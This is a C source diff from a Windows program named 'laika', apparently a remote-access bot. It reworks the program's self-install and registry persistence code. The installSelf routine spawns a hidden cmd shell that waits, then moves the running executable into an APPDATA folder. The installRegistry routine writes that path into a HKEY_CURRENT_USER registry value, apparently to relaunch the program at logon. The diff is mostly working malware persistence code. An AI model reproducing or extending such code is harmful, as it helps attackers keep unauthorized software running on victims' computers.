@@ -55,7 +55,7 @@ HKEY openReg(HKEY key, LPCTSTR subKey) {
     return hKey;
 }
 
-/* returns raw multi-string value from registry : see REG_MULTI_SZ at https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types */
+/* returns raw string value from registry  */
 LPTSTR readReg(HKEY key, LPCTSTR val, LPDWORD sz) {
     LPTSTR str = NULL;
     DWORD ret;
@@ -65,7 +65,7 @@ LPTSTR readReg(HKEY key, LPCTSTR val, LPDWORD sz) {
     RegQueryValueEx(key, val, NULL, NULL, NULL, sz);
 
     if (*sz != 0) {
-        str = (LPCTSTR)laikaM_malloc(*sz);
+        str = (LPTSTR)laikaM_malloc(*sz);
 
         if ((ret = RegQueryValueEx(key, val, NULL, NULL, str, sz)) != ERROR_SUCCESS)
             LAIKA_ERROR("Failed to read registry!\n");
@@ -77,32 +77,48 @@ LPTSTR readReg(HKEY key, LPCTSTR val, LPDWORD sz) {
 void writeReg(HKEY key, LPCTSTR val, LPTSTR data, DWORD sz) {
     LONG code;
 
-    if ((code = RegSetValueEx(key, val, 0, REG_MULTI_SZ, (LPBYTE)data, sz)) != ERROR_SUCCESS)
+    if ((code = RegSetValueEx(key, val, 0, REG_SZ, (LPBYTE)data, sz)) != ERROR_SUCCESS)
         LAIKA_ERROR("Failed to write registry!\n");
 }
 
 void getExecutablePath(LPTSTR path) {
-    if (GetModuleFileName(NULL, path, MAX_PATH) == 0)
+    TCHAR modulePath[MAX_PATH] = {0};
+    if (GetModuleFileName(NULL, modulePath, MAX_PATH) == 0)
         LAIKA_ERROR("Failed to get executable path!\n");
+
+    lstrcat(path, TEXT("\""));
+    lstrcat(path, modulePath);
+    lstrcat(path, TEXT("\""));
+
+    LAIKA_DEBUG("EXE: %s\n", path);
 }
 
 void getInstallPath(LPTSTR path) {
+    TCHAR SHpath[MAX_PATH] = {0};
+
     /* SHGetFolderPath is deprecated but,,,,, it's still here for backwards compatibility and microsoft will probably never completely remove it :P */
-    if (SHGetFolderPath(NULL, CSIDL_APPDATA | CSIDL_FLAG_CREATE, NULL, 0, path) != S_OK)
+    if (SHGetFolderPath(NULL, CSIDL_APPDATA | CSIDL_FLAG_CREATE, NULL, 0, SHpath) != S_OK)
         LAIKA_ERROR("Failed to get APPDATA!\n");
 
-    PathAppend(path, TEXT(LAIKA_INSTALL_DIR));
+    PathAppend(SHpath, TEXT(LAIKA_INSTALL_DIR));
 
-    if (!CreateDirectory(path, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
+    if (!CreateDirectory(SHpath, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
         LAIKA_ERROR("Failed to create directory '%s'!\n", path);
 
-    PathAppend(path, TEXT(LAIKA_INSTALL_FILE));
+    PathAppend(SHpath, TEXT(LAIKA_INSTALL_FILE));
+
+    /* write to path */
+    lstrcat(path, TEXT("\""));
+    lstrcat(path, SHpath);
+    lstrcat(path, TEXT("\""));
+    
+    LAIKA_DEBUG("INSTALL: %s\n", path);
 }
 
 /* windows doesn't let you move/delete/modify any currently executing file (since a file handle to the executable is open), so we
     spawn a shell to move the exe *after* we exit. */
 void installSelf() {
-    TCHAR szFile[MAX_PATH], szInstall[MAX_PATH], szCmd[(MAX_PATH*4)];
+    TCHAR szFile[MAX_PATH] = {0}, szInstall[MAX_PATH] = {0}, szCmd[(MAX_PATH*4)] = {0};
 
     getExecutablePath(szFile);
     getInstallPath(szInstall);
@@ -115,7 +131,7 @@ void installSelf() {
     LAIKA_DEBUG("moving '%s' to '%s'!\n", szFile, szInstall);
 
     /* wait for 3 seconds (so our process has time to exit) & move the exe, then restart laika */
-    lstrcpy(szCmd, TEXT("/C timeout /t 3 > NUL & move "));
+    lstrcpy(szCmd, TEXT("/C timeout /t 3 > NUL & move /Y "));
     lstrcat(szCmd, szFile);
     lstrcat(szCmd, TEXT(" "));
     lstrcat(szCmd, szInstall);
@@ -130,7 +146,7 @@ void installSelf() {
 }
 
 void installRegistry() {
-    TCHAR newRegValue[MAX_PATH];
+    TCHAR newRegValue[MAX_PATH] = {0};
     LPTSTR regVal;
     DWORD regSz;
     DWORD newRegSz;
@@ -138,8 +154,7 @@ void installRegistry() {
 
     /* create REG_MULTI_SZ */
     getInstallPath(newRegValue);
-    newRegSz = lstrlen(newRegValue) + 1;
-    newRegValue[newRegSz] = '\0';
+    newRegSz = lstrlen(newRegValue);
 
     reg = openReg(HKEY_CURRENT_USER, TEXT(LAIKA_REG_KEY));
     if ((regVal = readReg(reg, TEXT(LAIKA_REG_VAL), &regSz)) != NULL) {
